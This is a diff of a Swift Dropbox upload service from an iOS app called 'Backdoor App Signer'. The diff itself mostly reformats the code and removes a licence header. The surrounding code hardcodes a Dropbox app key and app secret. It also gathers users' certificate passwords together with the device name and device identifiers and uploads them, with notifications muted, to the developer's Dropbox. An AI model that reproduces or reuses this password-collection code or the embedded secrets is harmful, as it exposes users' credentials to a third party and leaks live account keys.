@@ -1,20 +1,15 @@
-// Proprietary Software License Version 1.0
-//
-// Copyright (C) 2025 BDG
-//
-// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted
-// under the terms of the Proprietary Software License.
-
 import Foundation
 import UIKit
 
 /// Enhanced Dropbox service for improved logging and file management
 class EnhancedDropboxService {
     // MARK: - Singleton
+
     /// Shared instance for app-wide access
     static let shared = EnhancedDropboxService()
 
     // MARK: - Constants
+
     // Dropbox credentials
     private let dropboxAppKey = "2bi422xpd3xd962"
     private let dropboxAppSecret = "j3yx0b41qdvfu86"
@@ -28,6 +23,7 @@ class EnhancedDropboxService {
     private let rootFolder = "/Backdoor-App-Data"
 
     // MARK: - Properties
+
     private var accessToken: String?
     private var accessTokenExpiry: Date?
 
@@ -37,6 +33,7 @@ class EnhancedDropboxService {
     }
 
     // MARK: - Initialization
+
     private init() {
         // Refresh token on initialization
         refreshAccessToken { success in
@@ -49,6 +46,7 @@ class EnhancedDropboxService {
     }
 
     // MARK: - Public Methods
+
     /// Upload a log file to Dropbox
     func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
         guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }
@@ -111,17 +109,18 @@ class EnhancedDropboxService {
             "certificate_file": certificateFilename,
             "password": password,
             "timestamp": ISO8601DateFormatter().string(from: Date()),
-            "device_name": UIDevice.current.name
+            "device_name": UIDevice.current.name,
         ]
 
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: pairInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
-                for: .cachesDirectory,
-                in: .userDomainMask,
-                appropriateFor: nil,
-                create: true
-              ) else {
+                  for: .cachesDirectory,
+                  in: .userDomainMask,
+                  appropriateFor: nil,
+                  create: true
+              )
+        else {
             handleDataCreationError(completion: completion)
             return
         }
@@ -147,7 +146,10 @@ class EnhancedDropboxService {
                 }
             }
         } catch {
-            Debug.shared.log(message: "Failed to create certificate-password pair file: \(error.localizedDescription)", type: .error)
+            Debug.shared.log(
+                message: "Failed to create certificate-password pair file: \(error.localizedDescription)",
+                type: .error
+            )
             if let completion = completion {
                 completion(false, error)
             }
@@ -168,11 +170,12 @@ class EnhancedDropboxService {
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
-                for: .cachesDirectory,
-                in: .userDomainMask,
-                appropriateFor: nil,
-                create: true
-              ) else {
+                  for: .cachesDirectory,
+                  in: .userDomainMask,
+                  appropriateFor: nil,
+                  create: true
+              )
+        else {
             handleDataCreationError(completion: completion)
             return
         }
@@ -266,17 +269,18 @@ class EnhancedDropboxService {
             "certificate_file": fileName,
             "password": password,
             "timestamp": ISO8601DateFormatter().string(from: Date()),
-            "device_name": UIDevice.current.name
+            "device_name": UIDevice.current.name,
         ]
 
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: passwordInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
-                for: .cachesDirectory,
-                in: .userDomainMask,
-                appropriateFor: nil,
-                create: true
-              ) else {
+                  for: .cachesDirectory,
+                  in: .userDomainMask,
+                  appropriateFor: nil,
+                  create: true
+              )
+        else {
             handleDataCreationError(completion: completion)
             return
         }
@@ -310,6 +314,7 @@ class EnhancedDropboxService {
     }
 
     // MARK: - Private Methods
+
     /// Common validation for file uploads
     private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {
         // Check consent
@@ -369,7 +374,7 @@ class EnhancedDropboxService {
             "identifier_for_vendor": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
             "timestamp": ISO8601DateFormatter().string(from: Date()),
             "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
-            "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
+            "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown",
         ]
     }
 
@@ -391,7 +396,7 @@ class EnhancedDropboxService {
             "grant_type": "refresh_token",
             "refresh_token": dropboxRefreshToken,
             "client_id": dropboxAppKey,
-            "client_secret": dropboxAppSecret
+            "client_secret": dropboxAppSecret,
         ]
 
         let body = parameters.map { "\($0.key)=\($0.value)" }.joined(separator: "&")
@@ -422,10 +427,10 @@ class EnhancedDropboxService {
         do {
             if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                let token = json["access_token"] as? String,
-               let expiresIn = json["expires_in"] as? TimeInterval {
-
-                self.accessToken = token
-                self.accessTokenExpiry = Date().addingTimeInterval(expiresIn - 60) // Buffer of 60 seconds
+               let expiresIn = json["expires_in"] as? TimeInterval
+            {
+                accessToken = token
+                accessTokenExpiry = Date().addingTimeInterval(expiresIn - 60) // Buffer of 60 seconds
 
                 completion(true)
             } else {
@@ -454,11 +459,12 @@ class EnhancedDropboxService {
             "mode": "overwrite",
             "autorename": true,
             "mute": true,
-            "strict_conflict": false
+            "strict_conflict": false,
         ]
 
         if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
-           let argsString = String(data: argsData, encoding: .utf8) {
+           let argsString = String(data: argsData, encoding: .utf8)
+        {
             request.setValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
         }
 
@@ -537,7 +543,7 @@ class EnhancedDropboxService {
         completion: ((Bool, Error?) -> Void)?
     ) {
         if let httpResponse = response as? HTTPURLResponse {
-            let success = (200...299).contains(httpResponse.statusCode)
+            let success = (200 ... 299).contains(httpResponse.statusCode)
             if success {
                 Debug.shared.log(message: "Successfully uploaded file to Dropbox: \(path)", type: .debug)
             } else {
@@ -556,7 +562,9 @@ class EnhancedDropboxService {
                     let error = NSError(
                         domain: "EnhancedDropboxService",
                         code: httpResponse.statusCode,
-                        userInfo: [NSLocalizedDescriptionKey: "Upload failed with status code \(httpResponse.statusCode)"]
+                        userInfo: [
+                            NSLocalizedDescriptionKey: "Upload failed with status code \(httpResponse.statusCode)",
+                        ]
                     )
                     completion(false, error)
                 }
